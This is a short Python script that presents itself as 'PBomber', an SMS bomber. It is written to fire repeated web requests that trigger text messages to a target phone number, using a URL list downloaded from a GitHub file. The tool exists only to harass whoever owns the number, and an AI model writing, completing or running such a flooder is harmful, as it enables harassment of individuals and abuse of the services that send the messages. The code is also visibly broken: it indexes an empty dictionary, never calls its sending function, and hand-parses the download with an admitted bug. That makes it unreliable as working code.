import requests
import urllib

logo = """
=======      =====    ||\\     /||  =======    =======  ======= 
||     ||  ||     ||  || |   | ||  ||     ||  ||       ||     ||
||     ||  ||     ||  || |   | ||  ||     ||  ||       ||     ||
||=====    ||     ||  || |   | ||  ||=====    ||=====  ||===== 
||     ||  ||     ||  ||  \\ /  ||  ||     ||  ||       ||     ||
||     ||  ||     ||  ||   -   ||  ||     ||  ||       ||     ||
=======      =====    ||       ||  =======    =======  ||     ||
"""

about = "PBomber - SMS Bomber, written on Python. Created By IgorToxichnyy."

Base = {}

def start(num):
	i = 0
	while i < len(Base):
		requests.get(Base[0].format(num))
		i += 1

def update():
	url=list(str(requests.get("https://raw.githubusercontent.com/igortoxichnyy/PBomber/main/base.txt").content))

	del url[0]

	i = 0
	while i < len(url):
		if url[i] == "'":
			del url[i]
			i+=1
		elif url[i] == "\\":
			if url[i+1] == "r":
				del url[i]
				del url[i]
			elif url[i+1] == "n":
				del url[i]
				url[i] = "\n"
				i+=1
			elif url[i+1] == "\\":
				i+=2
		else:
			i+=1

	for elem in url:
		print(elem, end="")

	#NOTE: It's temporary solution, because idk why this bug appears

if __name__ == '__main__':
	update()